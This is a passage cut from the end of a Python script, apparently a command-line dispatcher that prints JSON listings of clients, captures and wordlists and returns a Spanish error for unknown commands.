            print(json.dumps({"ok": True, "clients": clients, "count": len(clients)}))
    elif cmd == 'list_captures':
        caps = list_captures()
        print(json.dumps({"ok": True, "captures": caps, "count": len(caps)}))
    elif cmd == 'list_wordlists':
        wls = list_wordlists()
        print(json.dumps({"ok": True, "wordlists": wls, "count": len(wls)}))
    else:
        print(json.dumps({"ok": False, "error": f"comando desconocido: {cmd}"}))
        sys.exit(1)

if __name__ == "__main__":
    main()
